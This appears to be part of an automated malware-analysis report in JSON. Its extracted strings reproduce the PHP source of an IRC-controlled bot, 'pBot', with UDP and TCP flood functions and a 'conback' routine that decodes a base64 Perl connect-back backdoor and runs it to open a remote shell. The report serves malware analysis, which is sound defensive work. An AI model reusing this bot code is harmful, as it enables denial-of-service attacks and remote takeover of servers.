            "break;",
            "$old_buf = $this->buf;",
            "$this->start();",
            "function send($msg)",
            "fwrite($this->conn,\"$msg\\r\\n\");",
            "function join($chan,$key=NULL)",
            "$this->send(\"JOIN $chan $key\");",
            "function privmsg($to,$msg)",
            "$this->send(\"PRIVMSG $to :$msg\");",
            "function notice($to,$msg)",
            "$this->send(\"NOTICE $to :$msg\");",
            "function is_logged_in($host)",
            "if(isset($this->users[$host]))",
            "return 1;",
            "else",
            "return 0;",
            "function log_in($host)",
            "$this->users[$host] = true;",
            "function log_out($host)",
            "unset($this->users[$host]);",
            "function set_nick()",
            "if(isset($_SERVER['SERVER_SOFTWARE']))",
            "if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"apache\"))",
            "$this->nick = \"[A]\";",
            "elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"iis\"))",
            "$this->nick = \"[B]\";",
            "elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"xitami\"))",
            "$this->nick = \"[C]\";",
            "else",
            "$this->nick = \"[D]\";",
            "else",
            "$this->nick = \"[E]\";",
            "$this->nick .= $this->config['prefix'];",
            "for($i=0;$i<$this->config['maxrand'];$i++)",
            "$this->nick .= mt_rand(0,9);",
            "$this->send(\"NICK \".$this->nick);",
            "function udpflood($host,$packetsize,$time) {",
            "$this->privmsg($this->config['chan'],\"[\\2UdpFlood Started!\\2]\");",
            "$packet = \"\";",
            "for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }",
            "$timei = time();",
            "$i = 0;",
            "while(time()-$timei < $time) {",
            "$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);",
            "fwrite($fp,$packet);",
            "fclose($fp);",
            "$i++;",
            "$env = $i * $packetsize;",
            "$env = $env / 1048576;",
            "$vel = $env / $time;",
            "$vel = round($vel);",
            "$env = round($env);",
            "$this->privmsg($this->config['chan'],\"[\\2UdpFlood Finished!\\2]: $env MB enviados / Media: $vel MB/s \");",
            "function tcpflood($host,$packets,$packetsize,$port,$delay)",
            "$this->privmsg($this->config['chan'],\"[\\2TcpFlood Started!\\2]\");",
            "$packet = \"\";",
            "for($i=0;$i<$packetsize;$i++)",
            "$packet .= chr(mt_rand(1,256));",
            "for($i=0;$i<$packets;$i++)",
            "if(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5))",
            "$this->privmsg($this->config['chan'],\"[\\2TcpFlood\\2]: Error: <$e>\");",
            "return 0;",
            "else",
            "fwrite($fp,$packet);",
            "fclose($fp);",
            "sleep($delay);",
            "$this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets pacotes para $host:$port.\");",
            "function conback($ip,$port)",
            "$this->privmsg($this->config['chan'],\"[\\2conback\\2]: tentando conectando a $ip:$port\");",
            "$dc_source = \"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==\";",
            "if (is_writable(\"/tmp\"))",
            "if (file_exists(\"/tmp/dc.pl\")) { unlink(\"/tmp/dc.pl\"); }",
            "$fp=fopen(\"/tmp/dc.pl\",\"w\");",
            "fwrite($fp,base64_decode($dc_source));",
            "passthru(\"perl /tmp/dc.pl $ip $port &\");",
            "unlink(\"/tmp/dc.pl\");",
            "else",
            "if (is_writable(\"/var/tmp\"))",
            "if (file_exists(\"/var/tmp/dc.pl\")) { unlink(\"/var/tmp/dc.pl\"); }",
            "$fp=fopen(\"/var/tmp/dc.pl\",\"w\");",
            "fwrite($fp,base64_decode($dc_source));",
            "passthru(\"perl /var/tmp/dc.pl $ip $port &\");",
            "unlink(\"/var/tmp/dc.pl\");",
            "if (is_writable(\".\"))",
            "if (file_exists(\"dc.pl\")) { unlink(\"dc.pl\"); }",
            "$fp=fopen(\"dc.pl\",\"w\");",
            "fwrite($fp,base64_decode($dc_source));",
            "passthru(\"perl dc.pl $ip $port &\");",
            "unlink(\"dc.pl\");",
            "$bot = new pBot;",
            "$bot->start();"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "127.0.0.1"
        ],
        "url": [
            "http://your.host/file",
            "http://"
        ]
    },
    "time": "0:00:00.395985",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
